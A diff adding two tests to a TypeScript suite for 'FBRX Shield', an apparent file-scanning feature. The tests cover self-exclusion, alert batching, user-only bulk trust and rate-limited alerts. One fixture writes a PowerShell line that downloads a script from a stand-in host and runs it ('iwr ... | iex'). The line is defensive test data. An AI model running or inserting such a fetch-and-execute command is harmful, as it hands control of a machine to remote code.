@@ -294,6 +294,78 @@ describe('FBRX Shield on a computer', () => {
     }
   });
 
+  it('never flags FBRX itself, tells about a scan once, and lets the person trust many at once', async () => {
+    const { kernel, cleanup } = await makeKernel({ start: false });
+    const home = tempDir('fbrx-home-');
+    const downloads = join(home, 'Downloads');
+    mkdirSync(downloads);
+    mkdirSync(join(home, 'Desktop'));
+    kernel.platform.specialDirs = () => ({ home, documents: join(home, 'Documents'), desktop: join(home, 'Desktop'), downloads });
+    kernel.settings.update({ protection: { provider: 'shield', shield: { watchDownloads: false } } });
+    try {
+      await kernel.start();
+      // FBRX's source, unzipped and built in Downloads: thousands of scripts that look like downloads.
+      const src = join(downloads, 'FBRX-1.9.8');
+      mkdirSync(join(src, 'apps', 'desktop'), { recursive: true });
+      mkdirSync(join(src, 'node_modules', 'left-pad'), { recursive: true });
+      writeFileSync(join(src, 'package.json'), JSON.stringify({ name: 'fbrx-os' }));
+      writeFileSync(join(src, 'node_modules', 'left-pad', 'index.js'), 'module.exports = 1');
+      writeFileSync(join(src, 'apps', 'desktop', 'setup.ps1'), 'iwr https://x.example/a.ps1 | iex');
+      // Someone else's project in Downloads: its packages' code does not count as downloaded either.
+      mkdirSync(join(downloads, 'site', 'node_modules', 'x'), { recursive: true });
+      writeFileSync(join(downloads, 'site', 'node_modules', 'x', 'index.js'), 'module.exports = 1');
+      // Real downloads that look suspicious.
+      writeFileSync(join(downloads, 'invoice.js'), 'WScript.Echo(1)');
+      mkdirSync(join(downloads, 'batch'));
+      for (const n of ['a', 'b', 'c']) writeFileSync(join(downloads, 'batch', `${n}.pdf.exe`), 'MZ');
+      const shieldAlerts = async () => ((await kernel.call('alerts.inbox', { limit: 50 }, USER)) as Array<{ ruleId: string; title: string }>).filter((a) => a.ruleId === 'shield_threat');
+
+      const done = await finished(kernel, (await kernel.call('protection.scan', { type: 'custom', path: downloads }, USER)) as ScanJob);
+      expect(done.detections.map((d) => d.path.split(/[\\/]/).pop()).sort()).toEqual(['a.pdf.exe', 'b.pdf.exe', 'c.pdf.exe', 'invoice.js']);
+      // One alert for the whole scan, not one per file.
+      expect((await shieldAlerts()).map((a) => a.title)).toEqual(['FBRX Shield found 4 items']);
+      // Scanning inside FBRX's folder finds nothing.
+      expect((await finished(kernel, (await kernel.call('protection.scan', { type: 'custom', path: join(src, 'apps') }, USER)) as ScanJob)).files).toBe(0);
+
+      // Trust everything suspicious in one folder, then the rest; only the person can.
+      await expect(kernel.call('shield.allowMany', {}, LOCAL_API)).rejects.toThrow();
+      expect(await kernel.call('shield.allowMany', { folder: join(downloads, 'batch') }, USER)).toEqual({ allowed: 3 });
+      expect(await kernel.call('shield.allowMany', {}, USER)).toEqual({ allowed: 1 });
+      expect(((await kernel.call('protection.status', { refresh: true }, USER)) as ProtectionStatus).shield.open).toBe(0);
+
+      // New downloads tell one by one, three a minute at most; the rest wait to be counted in one alert.
+      const before = (await shieldAlerts()).length;
+      for (let i = 0; i < 6; i++) {
+        kernel.protection.onDetection({ id: `shd_burst${i}`, path: join(downloads, `x${i}.js`), sha256: null, size: 1, kind: 'suspicious', name: 'Risky file from the internet', engine: 'heuristic', reason: '', source: 'download', at: new Date().toISOString(), action: 'open', actionAt: null });
+      }
+      await waitFor(async () => (await shieldAlerts()).length >= before + 3);
+      expect((await shieldAlerts()).length).toBe(before + 3);
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it('clears findings it would no longer flag, and ones whose file is gone', async () => {
+    const { kernel, cleanup } = await makeKernel();
+    try {
+      // Findings an older FBRX Shield recorded: a file in a copy of FBRX, one that is gone, and a real one.
+      const src = tempDir('fbrx-src-');
+      mkdirSync(join(src, 'apps', 'desktop'), { recursive: true });
+      writeFileSync(join(src, 'package.json'), JSON.stringify({ name: 'fbrx-os' }));
+      writeFileSync(join(src, 'tool.js'), 'x');
+      const other = tempDir('fbrx-dl-');
+      writeFileSync(join(other, 'invoice.pdf.exe'), 'MZ');
+      const old = (name: string) => ({ verdict: { kind: 'suspicious' as const, engine: 'heuristic' as const, name, reason: 'an older rule' }, sha256: null, size: 1 });
+      kernel.shield.record(join(src, 'tool.js'), old('Risky file from the internet'), 'scan');
+      kernel.shield.record(join(other, 'gone.js'), old('Risky file from the internet'), 'scan');
+      kernel.shield.record(join(other, 'invoice.pdf.exe'), old('Disguised program'), 'scan');
+      expect(await kernel.call('shield.recheck', undefined, USER)).toEqual({ cleared: 1, gone: 1 });
+      expect(kernel.shield.detections().filter((d) => d.action === 'open').map((d) => d.path)).toEqual([join(other, 'invoice.pdf.exe')]);
+    } finally {
+      await cleanup();
+    }
+  });
+
   it('never watches the home folder itself, even when it is reported as Downloads', async () => {
     const { kernel, cleanup } = await makeKernel({ start: false });
     const home = tempDir('fbrx-home-');
